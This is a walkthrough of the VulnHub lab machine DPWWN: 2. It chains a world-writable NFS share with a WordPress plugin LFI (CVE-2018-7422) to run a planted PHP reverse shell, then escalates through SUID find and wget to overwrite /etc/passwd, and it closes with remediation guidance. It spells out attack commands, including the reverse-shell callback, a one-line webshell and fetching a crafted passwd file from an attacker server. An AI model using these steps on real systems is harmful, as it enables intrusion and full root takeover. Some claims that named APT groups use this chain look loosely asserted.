# DPWWN: 2 — NFS Wide Open, LFI Knocking

DPWWN: 2 steps up the difficulty from its predecessor. You combine two separate misconfigurations: an NFS share exported to everyone and a WordPress plugin with a known Local File Inclusion vulnerability. Plant a PHP shell on the NFS mount, trigger it through the LFI, and you have a shell. Then abuse a SUID `find` binary to give `wget` the SUID bit, overwrite `/etc/passwd`, and log in as root. Each step is a real-world attack primitive — this machine is a great study of how seemingly separate vulnerabilities become devastating when chained. Legit solid box. ᕕ( ᐛ )ᕗ

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | DPWWN: 2 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/dpwwn-2,343/ |
| **Techniques** | Nmap service enumeration, WordPress plugin audit, Local File Inclusion (EDB-44340), NFS share abuse, PHP reverse shell via LFI+NFS chain, SUID find abuse (GTFOBins), SUID wget privilege escalation, /etc/passwd overwrite |
| **CVEs** | CVE-2018-7422 (WordPress Site Editor 1.1.1 LFI — EDB-44340), CWE-276 (Incorrect Default Permissions — NFS export to everyone), CWE-269 (Improper Privilege Management — SUID on find) |
| **APT Groups** | APT41: chains LFI and NFS misconfigurations for initial access in enterprise WordPress environments; FIN7: uses SUID binary abuse as post-exploitation privilege escalation in Linux targets |

---

## Attack Summary

```
nmap: HTTP (80/443), NFS (2049)
    |
    v
dirb → /wordpress/ discovered
    |
    v
wpscan → Site Editor 1.1.1 plugin vulnerable to LFI (EDB-44340)
    |
    v
showmount -e → NFS export /home/dpwwn02 (everyone)
    |
    v
Mount NFS share → plant shell.php in /home/dpwwn02/
    |
    v
Trigger LFI: ajax_path=/home/dpwwn02/shell.php → reverse shell (low-priv user)
    |
    v
find / -perm -u=s → /usr/bin/find has SUID
    |
    v
find /home -exec chmod u+s /usr/bin/wget \;
    |
    v
Craft /etc/passwd with new root-UID user → serve via HTTP
    |
    v
SUID wget -O /etc/passwd → overwrite passwd
    |
    v
su raj (pass123) → uid=0(root) → /root/dpwwn-02-FLAG.txt
```

---

## Methodology

1. Full port scan: HTTP (80, 443) and NFS (2049)
2. Web enumeration: discover WordPress installation
3. WPScan plugin audit: identify vulnerable Site Editor 1.1.1 (LFI)
4. NFS enumeration: identify world-accessible export `/home/dpwwn02`
5. Plant PHP reverse shell on NFS mount
6. Trigger LFI to execute the planted shell
7. Discover SUID `find` binary via GTFOBins
8. Use SUID `find` to add SUID bit to `wget`
9. Overwrite `/etc/passwd` with crafted entry via SUID `wget`
10. Switch to the new root-UID user

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 10.10.10.0/24
# Target: 10.10.10.10

nmap -sV -sC -p- 10.10.10.10
```

Expected output:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd
443/tcp  open  ssl/http Apache httpd
2049/tcp open  nfs     NFS
```

NFS on port 2049 is the most interesting finding here. An exposed NFS share in a CTF almost always means a world-accessible export. HTTP/HTTPS hints at a web application.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration and WordPress Discovery

Browse to `http://10.10.10.10/` — Apache default page. Run directory brute-force:

```bash
dirb http://10.10.10.10/
# Found: /wordpress/
```

Browse to `http://10.10.10.10/wordpress/` — WordPress site confirmed.

```bash
# Identify WordPress version and plugins
wpscan --url http://10.10.10.10/wordpress -e p --plugins-detection aggressive
```

WPScan output (key finding):

```
[!] Plugin: site-editor
    | Version: 1.1.1
    | Vulnerabilities:
    |  - Local File Inclusion
    |    - EDB-ID: 44340
```

Site Editor 1.1.1 has a known LFI via the `ajax_path` parameter in `ajax_shortcode_pattern.php`. This is CVE-2018-7422.

**Real-world note:** WordPress plugin vulnerabilities account for over 95% of WordPress security issues. Outdated plugins with publicly documented CVEs are a consistent initial access vector. APT41 has specifically targeted WordPress installations in healthcare sector attacks, leveraging plugin LFIs for initial foothold.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application, T1083 — File and Directory Discovery

---

## Step 3 — NFS Share Enumeration

```bash
showmount -e 10.10.10.10
```

Output:

```
Export list for 10.10.10.10:
/home/dpwwn02  (everyone)
```

The NFS share `/home/dpwwn02` is exported to everyone. This means any system on the network can mount it and read/write files. Combined with the LFI, this is lethal: if we plant a PHP file on the NFS mount, and the LFI can reach that path, the web server will execute it.

**Real-world note:** NFS shares exported to `*` (everyone) with no `root_squash` or authentication are a critical misconfiguration. In production environments, exposed NFS shares have been used for lateral movement and data exfiltration. The combination with a web application LFI that can reference NFS-mounted paths is a documented attack pattern in OWASPs testing guides.

**MITRE ATT&CK:** T1135 — Network Share Discovery

---

## Step 4 — Confirm LFI Vulnerability

Validate the LFI by reading `/etc/passwd`:

```bash
curl "http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
```

The contents of `/etc/passwd` are returned in the response. LFI confirmed. The web server is reading arbitrary files on the system.

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 5 — NFS Shell Planting and LFI Trigger

Mount the NFS share:

```bash
mkdir /tmp/nfsmount
mount -t nfs 10.10.10.10:/home/dpwwn02 /tmp/nfsmount
ls /tmp/nfsmount
```

Copy and configure a PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/nfsmount/shell.php
# Edit /tmp/nfsmount/shell.php:
#   $ip = '10.10.10.128';   (attacker IP)
#   $port = 1234;
```

Start the listener:

```bash
nc -lvnp 1234
```

Trigger the LFI to execute the shell:

```bash
curl "http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/shell.php"
```

Reverse shell arrives as a low-privilege user. The web server's filesystem path (`/home/dpwwn02`) aligns with the NFS mount path, making the file reachable via the LFI.

**Alternative:** Use `pentestmonkey/php-reverse-shell` or a simpler `<?php system($_GET['cmd']); ?>` for a webshell first, then upgrade to a reverse shell.

**MITRE ATT&CK:** T1059.004 — Command and Scripting Interpreter: Unix Shell, T1505.003 — Server Software Component: Web Shell

---

## Step 6 — SUID Binary Enumeration

From the reverse shell, enumerate SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Key findings:

```
/usr/bin/find
/bin/su
/usr/bin/passwd
...
```

`/usr/bin/find` has the SUID bit set. According to GTFOBins, SUID `find` can execute arbitrary commands as root. This is the key to privilege escalation.

**Real-world note:** SUID on `find` is one of the most documented GTFOBins escalation paths. It should never be set on production systems. Regular SUID auditing with `find / -perm -u=s -type f 2>/dev/null` is a standard hardening check item in CIS benchmarks.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Step 7 — SUID Chain: find → wget → /etc/passwd Overwrite

Use the SUID `find` to add the SUID bit to `wget`:

```bash
find /home -exec chmod u+s /usr/bin/wget \;
ls -la /usr/bin/wget
# -rwsr-xr-x ... /usr/bin/wget
```

On the attacker machine, craft a malicious `/etc/passwd`:

```bash
# Get a copy of the current /etc/passwd from the target first
# (via the LFI or via the shell)
# Add a new root-UID user entry

# Generate password hash for "pass123":
openssl passwd -1 -salt user3 pass123
# Output: $1$user3$rSp9rLQBVNlc32K4.eSMk.  (example)

# Create the malicious passwd file
cp /etc/passwd /tmp/passwd_malicious
echo 'raj:$1$user3$rSp9rLQBVNlc32K4.eSMk.:0:0:raj:/root:/bin/bash' >> /tmp/passwd_malicious

# Serve it
python3 -m http.server 8080
```

On the target, use SUID wget to overwrite `/etc/passwd`:

```bash
wget -O /etc/passwd http://10.10.10.128:8080/passwd_malicious
```

Switch to the new root user:

```bash
su raj
# Password: pass123

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/dpwwn-02-FLAG.txt
```

Root obtained. gg!

**Alternative:** Instead of overwriting `/etc/passwd`, use the SUID wget to overwrite `/etc/cron.d/` with a cron entry or use SUID find directly with `-exec /bin/sh \; -quit` (if permissions allow).

**MITRE ATT&CK:** T1078 — Valid Accounts, T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used/Cracked |
|---|---|---|---|
| Injected credential | `raj:pass123` (UID 0) | Crafted and injected via SUID wget | su raj → root |
| Root flag | Contents of `/root/dpwwn-02-FLAG.txt` | After /etc/passwd overwrite | Final flag |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | NFS share exported to everyone | World-accessible NFS shares enable file planting and lateral movement; common in enterprise environments with legacy NFS configurations | Restrict NFS exports to specific IPs or subnets; enable `root_squash`; require Kerberos authentication for NFS |
| 2 | WordPress Site Editor 1.1.1 LFI (CVE-2018-7422) | Outdated WordPress plugins with public LFI CVEs are a consistent initial access vector | Maintain WordPress plugin inventory; patch or remove unused plugins; implement WAF rules for LFI patterns |
| 3 | NFS + LFI chaining enables file execution | Two low-severity misconfigurations become critical when combined | Conduct attack path analysis, not just individual vulnerability assessment; consider how findings chain |
| 4 | SUID on /usr/bin/find | GTFOBins documents dozens of SUID escalation paths; find is one of the most well-known | Audit SUID binaries regularly; remove SUID from non-essential binaries; use AppArmor/SELinux profiles |
| 5 | SUID wget allows /etc/passwd overwrite | Any program with SUID that can write arbitrary files can be used to overwrite critical system files | Never set SUID on wget or curl; use immutable flags on /etc/passwd where feasible |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Network Share Discovery | T1135 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Server Software Component: Web Shell | T1505.003 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control Mechanism: Setuid | T1548.001 |
| Defense Evasion | Defense Evasion | Valid Accounts | T1078 |

---

## Remediation and Containment

### Technical Fixes

1. **Restrict NFS exports** — modify `/etc/exports` to allow only specific trusted hosts: `/home/dpwwn02 192.168.x.x/24(rw,sync,no_subtree_check)` instead of `*(rw)`; add `root_squash` and `no_exec` options
2. **Update or remove Site Editor 1.1.1** — apply available patches or remove the plugin entirely; audit all installed plugins with `wpscan --enumerate p`
3. **Implement WAF rules for LFI** — block requests with `../` path traversal and absolute path injection in `ajax_path` parameters
4. **Remove SUID from find** — `chmod u-s /usr/bin/find`; audit all SUID binaries: `find / -perm -4000 2>/dev/null`
5. **Remove SUID from wget** — `chmod u-s /usr/bin/wget`; wget with SUID is never legitimate
6. **Protect /etc/passwd with immutable flag** — `chattr +i /etc/passwd`; attackers cannot overwrite it even with root-level file write
7. **Disable NFS on systems that don't need it** — `systemctl disable nfs-kernel-server; systemctl stop nfs-kernel-server`

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory NFS exports and WordPress plugins |
| Protect | Access Control | Restrict NFS to specific hosts; remove SUID from non-essential binaries |
| Protect | Data Security | Protect /etc/passwd with immutable flag; restrict NFS write access |
| Detect | Anomalies and Events | Alert on NFS mounts from unexpected hosts; monitor for LFI patterns in web logs |
| Respond | Response Planning | Remove planted webshells; revoke unauthorized NFS access; restore /etc/passwd from backup |
| Recover | Recovery Planning | Audit all system files for unauthorized modifications; rotate all service credentials |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict NFS exports to authorized hosts only |
| AC-6 | Least Privilege | Remove SUID from find and wget; apply minimal permissions to NFS shares |
| CM-7 | Least Functionality | Disable NFS if not required; remove unused WordPress plugins |
| SI-10 | Information Input Validation | Implement WAF rules blocking LFI patterns in web application inputs |
| SI-2 | Flaw Remediation | Patch CVE-2018-7422 (Site Editor 1.1.1) as a high-priority vulnerability |

### CISA KEV

CVE-2018-7422 (WordPress Site Editor 1.1.1 LFI) is a publicly documented vulnerability with published proof-of-concept exploit code on Exploit-DB (EDB-44340). The NFS misconfiguration enabling file planting aligns with CISA Advisory AA22-074A on threat actor exploitation of network service misconfigurations.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage Software | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges | MIL3 |
| Threat and Vulnerability Management (THREAT) | Identify and Prioritize Vulnerabilities | MIL2 |

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (NFS export restrictions; remove SUID binaries)
- **D3-IAVV** — Input Validation (WAF rules for LFI patterns)
- **D3-NTF** — Network Traffic Filtering (restrict NFS port 2049 to authorized subnets)

---

## Final Thoughts

DPWWN: 2 teaches the most important lesson in penetration testing: vulnerabilities don't exist in isolation. The NFS misconfiguration alone is low-to-medium severity — it lets you write files to a home directory. The WordPress LFI alone is medium severity — it lets you read arbitrary files. Combined, they enable remote code execution. That is why chained attack path analysis matters, and why vulnerability scanners that score findings in isolation miss the real risk.

The SUID chain (find → chmod wget → overwrite /etc/passwd) is a great example of how GTFOBins transforms a single misconfigured binary into a root shell. Any SUID audit that reveals `find` or `wget` should be treated as an immediate critical finding.

Chain everything. Think in attack paths. That is the DPWWN: 2 lesson.

Thanks guys!! (❍ᴥ❍ʋ)
